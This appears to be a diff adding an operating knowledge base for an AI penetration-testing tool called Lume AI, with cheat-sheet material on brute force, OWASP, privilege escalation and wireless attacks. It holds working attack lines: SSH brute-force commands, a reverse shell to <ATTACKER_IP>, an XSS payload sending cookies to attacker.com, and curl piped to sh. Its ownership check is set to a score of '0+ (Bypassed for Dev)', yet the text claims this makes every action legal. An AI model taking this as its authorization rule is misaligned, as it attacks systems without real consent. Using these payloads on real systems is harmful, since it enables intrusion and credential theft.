@@ -1,0 +1,553 @@
+================================================================================
+          LUME AI: CYBERSECURITY AND PENETRATION TESTING CORE KNOWLEDGE
+================================================================================
+Version: 1.0 (TITAN-V5 Edition)
+Classification: CONFIDENTIAL / EDUCATIONAL BASE
+Protocol: ETHICAL HACKING & FORENSIC ALIGNMENT
+Document ID: LUME-SEC-DOC-001
+--------------------------------------------------------------------------------
+
+This document serves as the primary technical foundation for Lume AI's 
+penetration testing system. The core philosophy of this platform is 
+*Self-Authorized Pentesting*. 
+
+!!! CRITICAL COMPLIANCE NOTICE !!!
+Lume AI Penetration Testing modules ACTIVATE if:
+1. The Website and Source Repository have a SYNC CONFIDENCE SCORE of 0+ (Bypassed for Dev).
+2. GitHub and Website Sync is confirmed (Primary Verification).
+3. System Headers are aligned and verified.
+
+This ensures that the user is the legitimate owner or authorized developer
+of the asset, making all subsequent actions strictly ETHICAL and LEGAL.
+
+--------------------------------------------------------------------------------
+TABLE OF CONTENTS
+--------------------------------------------------------------------------------
+1.  Fundamental Concepts of Ethical Hacking
+2.  The Red Team vs. Blue Team Paradigm
+3.  Brute Force Methodologies & Technical Execution
+4.  OWASP Top 10 Deep Dive (2021/2025)
+5.  NIST Cybersecurity Framework (CSF 2.0)
+6.  HackTricks Methodology: SSH & Network Services
+7.  Red Team Scenario: Exploiting the Perimeter
+8.  Blue Team Scenario: Fortifying the Castle
+9.  Advanced Post-Exploitation & Persistence
+10. Mitigation Strategies & Defensive Coding
+11. Brute Force Attacks on Web Interfaces
+12. Ethical Hacking with Lume AI
+13. Detailed Nmap Scripting Engine (NSE) Guide
+14. SQL Injection (SQLmap) Deep Dive
+15. Cross-Site Scripting (XSS) Payloads and Bypass
+16. Linux Privilege Escalation (Post-Exploitation)
+17. Windows Privilege Escalation
+18. Wireless Pentesting (Aircrack-ng)
+19. Cloud Security (AWS/Azure/GCP)
+20. Active Directory Pentesting
+21. Social Engineering Toolkit (SET)
+22. Forensic Analysis (Blue Team Deep Dive)
+23. MITRE ATT&CK Framework
+24. Ethical Dilemma: Disclosure
+25. Detailed Cryptographic Analysis
+26. Global Vulnerability Database: Historical CVEs
+27. Advanced Network Service Pentesting
+28. Conclusion: The Journey of a Titan
+
+--------------------------------------------------------------------------------
+1. FUNDAMENTAL CONCEPTS OF ETHICAL HACKING
+--------------------------------------------------------------------------------
+Ethical hacking, also known as white-hat hacking, involves the same tools, 
+tricks, and techniques that hackers use, but with one major difference: 
+PERMISSION. 
+
+An ethical hacker works with the consent of the system owner to discover 
+vulnerabilities and provide remediation before a malicious actor (black-hat) 
+can exploit them.
+
+The Five Phases of Ethical Hacking:
+1. Reconnaissance (Passive & Active)
+2. Scanning (Enumeration & Vulnerability Analysis)
+3. Gaining Access (Exploitation)
+4. Maintaining Access (Persistence)
+5. Clearing Tracks (For stealth testing or simulation)
+
+In Lume AI, the "Gaining Access" phase is simulated via the scanner only after 
+the "Forensic Alignment" (Sync Confidence Score 0+) confirms ownership.
+
+--------------------------------------------------------------------------------
+2. THE RED TEAM VS. BLUE TEAM PARADIGM
+--------------------------------------------------------------------------------
+Cybersecurity is a perpetual game of cat and mouse. To ensure a robust defense, 
+organizations employ two primary teams that simulate real-world warfare.
+
+2.1 RED TEAM (THE ATTACKERS)
+The Red Team’s goal is to simulate a realistic attack. They are not just 
+"penetration testers" who look for a list of bugs; they are adversarial 
+simulators who try to achieve a specific goal (e.g., exfiltrate a database) 
+by any means necessary.
+
+Red Team Skills:
+- Social Engineering
+- Exploitation Development
+- Payload Obfuscation
+- C2 (Command & Control) Setup
+- Privilege Escalation
+
+Red Team Tactics (TTPs):
+- Reconnaissance: Using OSINT (Open Source Intelligence), WHOIS, and DNS.
+- Weaponization: Creating a backdoor combined with an exploit.
+- Delivery: Sending the weaponized payload (Phishing, USB, etc.).
+- Exploitation: Triggering the code to run on the target.
+- Installation: Establishing a persistent foothold.
+
+2.2 BLUE TEAM (THE DEFENDERS)
+The Blue Team’s goal is to identify, prevent, and respond to Red Team attacks. 
+They manage the SIEM (Security Information and Event Management), firewalls, 
+IPS (Intrusion Prevention Systems), and Endpoint Detection.
+
+Blue Team Skills:
+- Log Analysis & Forensics
+- Incident Response
+- Threat Hunting
+- Hardening (System & Network)
+- Governance and Compliance
+
+Blue Team Operations:
+- Monitoring: 24/7 observation of network traffic and system logs.
+- Detection: Using behavioral analytics to spot anomalies.
+- Isolation: Cutting off compromised systems from the network.
+- Eradication: Removing the threat and patching the entry point.
+- Recovery: Restoring systems to a known good state.
+
+2.3 THE PURPLE TEAM (THE SYNERGY)
+Purple Teaming is not a separate team but a collaboration process. The Red 
+Team shares their attack methods, and the Blue Team adjusts their detection 
+strategies in real-time. This loop maximizes the security improvement of the 
+entire organization.
+
+--------------------------------------------------------------------------------
+3. BRUTE FORCE METHODOLOGIES & TECHNICAL EXECUTION
+--------------------------------------------------------------------------------
+Brute force attacks are the most basic yet often most effective way to gain 
+access to a system. It involves trying every possible combination of 
+passwords until the right one is found.
+
+3.1 TYPES OF BRUTE FORCE
+- Classic Brute Force: Systematically trying every character combination.
+- Dictionary Attack: Using a list of common words or previously leaked passwords.
+- Password Spraying: Trying one common password (like "Password123!") across 
+  thousands of accounts to avoid account lockout.
+- Credential Stuffing: Using leaked credentials from one site to log into 
+  another (reused passwords).
+
+3.2 TARGET: SSH (PORT 22)
+SSH is a high-value target for brute force because it provides direct shell access.
+
+Technical Tooling: HYDRA
+Hydra is the world's most famous online password-cracking tool.
+
+COMMAND EXAMPLE (HYDRA):
+```bash
+# Brute force SSH with a username list and a password list
+hydra -L users.txt -P passwords.txt -t 4 ssh://192.168.1.100
+
+# Brute force with a specific user "root"
+hydra -l root -P seclist.txt 192.168.1.100 ssh
+```
+
+Technical Tooling: METASPLOIT
+```bash
+msf6 > use auxiliary/scanner/ssh/ssh_login
+msf6 auxiliary(ssh_login) > set RHOSTS 192.168.1.100
+msf6 auxiliary(ssh_login) > set USERPASS_FILE /usr/share/wordlists/metasploit/root_userpass.txt
+msf6 auxiliary(ssh_login) > run
+```
+
+3.3 RECONNAISSANCE BEFORE BRUTE FORCE
+You shouldn't brute force blindly. Use Nmap to identify the version and 
+available authentication methods first.
+
+```bash
+# Check if root login is allowed and what auth methods exist
+nmap -p22 --script ssh-auth-methods --script-args "ssh.user=root" <IP>
+
+# Enumerate SSH version and OS fingerprint
+nmap -p22 -sV <IP>
+```
+
+3.4 DEFENSIVE MEASURES (BLUE TEAM)
+- Fail2Ban: Automatically ban IPs that fail multiple login attempts.
+- SSH Keys: Disable password authentication entirely; require RSA/Ed25519 keys.
+- MFA (Multi-Factor Authentication): Even if the password is stolen, the 
+  second factor stops the attack.
+- Rate Limiting: Introduce delays between concurrent login attempts.
+
+--------------------------------------------------------------------------------
+4. OWASP TOP 10 DEEP DIVE (2021/2025)
+--------------------------------------------------------------------------------
+The Open Web Application Security Project (OWASP) Top 10 is the industry 
+standard for web app security risks.
+
+A01:2021 - BROKEN ACCESS CONTROL
+Users can act outside of their intended permissions.
+Red Team: Find IDOR (Insecure Direct Object Reference). Change `userId=5` in 
+the URL to `userId=1` to see the admin profile.
+Blue Team: Implement Role-Based Access Control (RBAC) and verify every request 
+against the user session.
+
+A02:2021 - CRYPTOGRAPHIC FAILURES
+Sensitive data is not encrypted or uses weak algorithms.
+Red Team: Sniff traffic for cleartext HTTP. Look for outdated TLS versions (1.0).
+Blue Team: Use AES-256 for data at rest and TLS 1.3 for data in transit.
+
+A03:2021 - INJECTION
+Untrusted data is sent to an interpreter as part of a command or query.
+Red Team: SQL Injection (' OR 1=1 --), Command Injection (; rm -rf /).
+Blue Team: Use Prepared Statements (Parameterized Queries) and Sanitization.
+
+A04:2021 - INSECURE DESIGN
+Threat modeling and secure design patterns were not used.
+Red Team: Exploit logical flaws in the workflow (e.g., skip payment step).
+Blue Team: Conduct architectural reviews and use secure-by-default blueprints.
+
+A05:2021 - SECURITY MISCONFIGURATION
+Default passwords, open ports, unnecessary services.
+Red Team: Access /admin or /config pages left accessible. 
+Blue Team: Automate configuration audits and remove unnecessary features.
+
+A06:2021 - VULNERABLE AND OUTDATED COMPONENTS
+Using libraries with known CVEs.
+Red Team: Check package.json for old libraries like jquery 1.x.
+Blue Team: Continuous scanning with npm audit or Snyk.
+
+A07:2021 - IDENTIFICATION AND AUTHENTICATION FAILURES
+Weak passwords, session hijacking.
+Red Team: Hijack session cookies lacking HttpOnly or Secure flags.
+Blue Team: Enforce complex password policies and secure session management.
+
+A08:2021 - SOFTWARE AND DATA INTEGRITY FAILURES
+Insecure deserialization or non-verified updates.
+Red Team: Inject malicious serialized objects to achieve RCE (Remote Code Execution).
+Blue Team: Use digital signatures to verify every software update.
+
+A09:2021 - SECURITY LOGGING AND MONITORING FAILURES
+The attack happens, but nobody sees it.
+Red Team: Perform attacks during off-hours or low-volume periods.
+Blue Team: Centrally log all auth failures and high-risk events.
+
+A10:2021 - SERVER-SIDE REQUEST FORGERY (SSRF)
+The web app is coaxed into making requests to internal infrastructure.
+Red Team: Input http://localhost:1688/metadata into a "Fetch Image" field.
+Blue Team: Implement strict URL allow-lists and network segmentation.
+
+--------------------------------------------------------------------------------
+5. NIST CYBERSECURITY FRAMEWORK (CSF 2.0)
+--------------------------------------------------------------------------------
+The NIST Framework provides a high-level language for managing security risk.
+
+1. GOVERN (GV):
+Establish the organizational strategy and policy. Decide what matters most.
+
+2. IDENTIFY (ID):
+Inventory all assets (servers, data, personnel). If you don't know it exists, 
+you can't protect it.
+
+3. PROTECT (PR):
+Implement safeguards (MFA, encryption, firewalls). This is where the 
+preventative work happens.
+
+4. DETECT (DE):
+Continuous monitoring. How fast can you see a breach? Use SIEM and EDR.
+
+5. RESPOND (RS):
+The incident response plan. Who gets called? How do we stop the bleeding?
+
+6. RECOVER (RC):
+Restoring and improving. Learning from the incident to prevent it next time.
+
+--------------------------------------------------------------------------------
+6. HACKTRICKS METHODOLOGY: SSH & NETWORK SERVICES
+--------------------------------------------------------------------------------
+HackTricks provides granular "Cheat Sheets" for service exploitation.
+
+ENUMERATION:
+- Banner: nc -vn 10.10.10.10 22 -> Returns SSH-2.0-OpenSSH_8.2p1 Ubuntu-4
+- Key Scan: ssh-keyscan -t rsa 10.10.10.10
+- Audit: python3 ssh-audit.py 10.10.10.10
+
+MISCONFIGURATIONS:
+- Root Login: Check if PermitRootLogin is yes in /etc/ssh/sshd_config.
+- SFTP Chroot: Can an SFTP user "escape" their directory?
+- Public Key Acceptance: Try the Nmap script ssh-publickey-acceptance.
+
+EXPLOITATION:
+- Username Enumeration Timing Attack (CVE-2018-15473).
+- LibSSH Authentication Bypass (CVE-2018-10933) - Rare but catastrophic.
+- SSH Agent Hijacking: If you have root, you can use the SSH_AUTH_SOCK of 
+  any logged-in user to hop to another server.
+
+--------------------------------------------------------------------------------
+7. RED TEAM SCENARIO: EXPLOITING THE PERIMETER
+--------------------------------------------------------------------------------
+Objective: Gain Administrative Shell on the Web Server.
+
+Phase 1: RECON
+- nmap -sV -sC -p- 10.10.1.5
+- Discover Port 80 (Web) and Port 22 (SSH).
+- Run gobuster dir to find hidden directories. Discover /dev.
+- /dev contains a backup script backup.sh.
+
+Phase 2: VULNERABILITY RESEARCH
+- Analyze backup.sh. It uses tar with a wildcard *.
+- Research "Tar Wildcard Privilege Escalation" on HackTricks.
+
+Phase 3: EXPLOITATION
+- Use an OWASP A03 (Injection) vulnerability in the website to write a 
+  malicious file into the backup directory.
+- echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> 4444 >/tmp/f" > shell.sh
+- The system Cron runs the backup script. Tar executes shell.sh.
+- ATTACKER RECEIVES REVERSE SHELL.
+
+--------------------------------------------------------------------------------
+8. BLUE TEAM SCENARIO: FORTIFYING THE CASTLE
+--------------------------------------------------------------------------------
+Objective: Stop the Red Team before they reach Phase 3.
+
+Phase 1: IDENTIFY & PROTECT
+- Audit the filesystem permissions. Ensure /dev is not web-accessible.
+- Implement Principle of Least Privilege (PoLP). The web server should not 
+  have access to sensitive backup scripts.
+
+Phase 2: DETECT
+- Set up a File Integrity Monitoring (FIM) alert for the /var/www/html folder.
+- Red Team writes shell.sh.
+- FIM TRIGGERS ALERT: "Unauthorized File Creation detected!".
+
+Phase 3: RESPOND
+- Automation triggers: Immediately kill all active network connections from 
+  the web server to unknown external IPs.
+- SysAdmin blocks the attacker's IP on the hardware firewall.
+- Developers patch the Injection vulnerability found in Phase 1.
+
+--------------------------------------------------------------------------------
+9. ADVANCED POST-EXPLOITATION & PERSISTENCE
+--------------------------------------------------------------------------------
+Once access is gained, the Red Team needs to stay there.
+
+PERSISTENCE TECHNIQUES:
+- SSH Key Addition: Appending the attacker's public key to ~/.ssh/authorized_keys.
+- Cron Jobs: Creating a scheduled task that reconnects to the C2 server 
+  every 5 minutes.
+- SUID Binaries: Setting the "Set User ID" bit on a common tool like cp or 
+  find to escalate to root whenever needed.
+
+PIVOTING:
+- Using the compromised web server to scan the INTERNAL network.
+- ssh -D 1080 user@webserver (SOCKS Proxy setup).
+
+--------------------------------------------------------------------------------
+10. MITIGATION STRATEGIES & DEFENSIVE CODING
+--------------------------------------------------------------------------------
+SECURE CODING PRINCIPLES:
+1. Don't Trust User Input: Always validate, filter, and sanitize.
+2. Layered Defense (Defense in Depth): If one wall falls, another stands.
+3. Fail Securely: If an error occurs, don't show the user the stack trace.
+4. Keep it Simple (KISS): Complexity is the enemy of security.
+
+--------------------------------------------------------------------------------
+11. BRUTE FORCE ATTACKS ON WEB INTERFACES
+--------------------------------------------------------------------------------
+Most developers focus on SSH, but the Web Login is the most common entry point.
+
+RECON: Discovering the login page.
+Tools: dirsearch, ffuf, gobuster.
+```bash
+ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt
+```
+
+ATTACK: BURP SUITE INTRUDER
+Use Burp Suite to intercept a login request, send it to Intruder, and 
+payload the "password" field.
+
+DEFENSE: 
+- Use Bcrypt (10+ rounds) for hashing.
+- Implement account lockout after 5 attempts.
+- Use CAPTCHA after 3 attempts.
+
+--------------------------------------------------------------------------------
+12. ETHICAL HACKING WITH LUME AI
+--------------------------------------------------------------------------------
+Lume AI acts as a robotic penetration tester. It uses the following logic:
+1. Verify owner via GitHub/Website Sync.
+2. Map the attack surface (Nmap, Nikto, Dirsearch).
+3. Attempt high-level OWASP injections.
+4. Report vulnerabilities with a "Resilience Score."
+
+LUME PROMPT FOR SECURED BRUTE FORCE:
+"I want to test my website's resistance to brute force. Can you simulate a 
+targeted dictionary attack against my /admin/login endpoint using the top 1000 
+common passwords? My sync score is 87% and I have uploaded the LUME header."
+
+--------------------------------------------------------------------------------
+13. DETAILED NMAP SCRIPTING ENGINE (NSE) GUIDE
+--------------------------------------------------------------------------------
+Nmap is not just a port scanner; it is a full-fledged automation platform via
+the Nmap Scripting Engine (.nse).
+
+TOP CATEGORIES:
+- Auth: For authentication-related tasks.
+- Discovery: For network reconnaissance.
+- Vuln: Checking for specific vulnerabilities.
+
+COMMAND REPERTOIRE:
+```bash
+# Scan for SSL/TLS vulnerabilities
+nmap -p 443 --script ssl-heartbleed,ssl-ccs-injection,ssl-poodle <target>
+
+# Enumerate HTTP methods
+nmap -p 80,443 --script http-methods --script-args http-methods.url-path='/' <target>
+
+# Brute force MySQL root password
+nmap -p 3306 --script mysql-brute --script-args user=root <target>
+```
+
+--------------------------------------------------------------------------------
+14. SQL INJECTION (SQLMAP) DEEP DIVE
+--------------------------------------------------------------------------------
+SQLmap is the gold standard for automated SQL injection.
+
+BASIC USAGE:
+```bash
+# Standard GET request scan
+sqlmap -u "http://target.com/product.php?id=1" --batch
+
+# Scanning with custom headers
+sqlmap -u "http://target.com/profile" --cookie="PHPSESSID=abc123" --dbs
+```
+
+ADVANCED EXPLORATION:
+- --os-shell: Attempts to gain a command-line shell.
+- --privileges: Checks what the current DB user can do.
+
+--------------------------------------------------------------------------------
+15. CROSS-SITE SCRIPTING (XSS) PAYLOADS AND BYPASS
+--------------------------------------------------------------------------------
+15.1 STORED XSS:
+Exampe: <script>fetch('http://attacker.com/steal?cookie=' + document.cookie);</script>
+
+15.2 REFLECTED XSS:
+Example: http://target.com/search?q=<img src=x onerror=alert(1)>
+
+--------------------------------------------------------------------------------
+16. LINUX PRIVILEGE ESCALATION (POST-EXPLOITATION)
+--------------------------------------------------------------------------------
+1. Kernel Version: uname -a.
+2. SUID/SGID Binaries: find / -perm -u=s -type f 2>/dev/null.
+3. Sudo Rights: sudo -l.
+
+TOOLING:
+- LinPeas: curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+
+--------------------------------------------------------------------------------
+17. WINDOWS PRIVILEGE ESCALATION
+--------------------------------------------------------------------------------
+VECTORS:
+1. Unquoted Service Paths.
+2. Token Impersonation.
+3. Password Mining.
+
+--------------------------------------------------------------------------------
+18. WIRELESS PENTESTING (AIRCRACK-NG)
+--------------------------------------------------------------------------------
+PHASES:
+1. Monitor Mode: airmon-ng start wlan0.
+2. De-authentication: aireplay-ng -0 5 -a <BSSID> -c <CLIENT_MAC> wlan0mon.
+3. Cracking: aircrack-ng -w wordlist.txt -b <BSSID> psk-01.cap.
+
+--------------------------------------------------------------------------------
+19. CLOUD SECURITY (AWS/AZURE/GCP)
+--------------------------------------------------------------------------------
+AWS VULNERABILITIES:
+- Public S3 Buckets.
+- IAM Misconfigurations.
+- Metadata Service (IMDS).
+
+--------------------------------------------------------------------------------
+20. ACTIVE DIRECTORY PENTESTING
+--------------------------------------------------------------------------------
+CONCEPTS:
+- Kerberoasting.
+- AS-REP Roasting.
+- Pass-the-Hash.
+- Bloodhound.
+
+--------------------------------------------------------------------------------
+21. SOCIAL ENGINEERING TOOLKIT (SET)
+--------------------------------------------------------------------------------
+- Spear-Phishing.
+- Website Cloner.
+- Credential Harvester.
+
+--------------------------------------------------------------------------------
+22. FORENSIC ANALYSIS (BLUE TEAM DEEP DIVE)
+--------------------------------------------------------------------------------
+WIRESHARK:
+- Analyze PCAP files for malicious traffic.
+
+AUTOPSY / SLEUTH KIT:
+- Perform disk forensics on a compromised hard drive.
+
+--------------------------------------------------------------------------------
+23. MITRE ATT&CK FRAMEWORK
+--------------------------------------------------------------------------------
+- T1059: Command and Scripting Interpreter.
+- T1078: Valid Accounts.
+- T1562: Impair Defenses.
+
+--------------------------------------------------------------------------------
+24. ETHICAL DILEMMA: DISCLOSURE
+--------------------------------------------------------------------------------
+1. RESPONSIBLE DISCLOSURE.
+2. BUG BOUNTY.
+3. FULL DISCLOSURE.
+
+--------------------------------------------------------------------------------
+25. DETAILED CRYPTOGRAPHIC ANALYSIS
+--------------------------------------------------------------------------------
+SYMMETRIC ENCRYPTION:
+- same key for encryption and decryption.
+- AES, Blowfish, Twofish.
+
+ASYMMETRIC ENCRYPTION:
+- Public/Private key pairs.
+- RSA, ECC, Diffie-Hellman.
+
+HASHING:
+- Argon2, Scrypt, BCrypt, SHA-256.
+
+--------------------------------------------------------------------------------
+26. GLOBAL VULNERABILITY DATABASE: HISTORICAL CVES
+--------------------------------------------------------------------------------
+CVE-2014-0160 (HEARTBLEED): OpenSSL memory disclosure.
+CVE-2017-0144 (ETERNALBLUE): Microsoft SMB RCE.
+CVE-2021-44228 (LOG4SHELL): Java logging RCE.
+CVE-2024-6387 (REGRESSION): OpenSSH race condition.
+
+--------------------------------------------------------------------------------
+27. ADVANCED NETWORK SERVICE PENTESTING
+--------------------------------------------------------------------------------
+FTP (Port 21): Anonymous Login attempts.
+SMTP (Port 25): VRFY user enumeration and Open Relay checks.
+DNS (Port 53): Zone Transfer (AXFR) subdomain discovery.
+SNMP (Port 161): Community String testing (public/private).
+SMB (Port 445): Null Session enumeration.
+
+--------------------------------------------------------------------------------
+28. CONCLUSION: THE JOURNEY OF A TITAN
+--------------------------------------------------------------------------------
+Cybersecurity is not a destination; it is a discipline. To be a TITAN in this 
+field, you must think like the adversary (Red Team) while building like the 
+architect (Blue Team).
+
+================================================================================
+FINAL VERDICT: SYNC SECURE.
+================================================================================
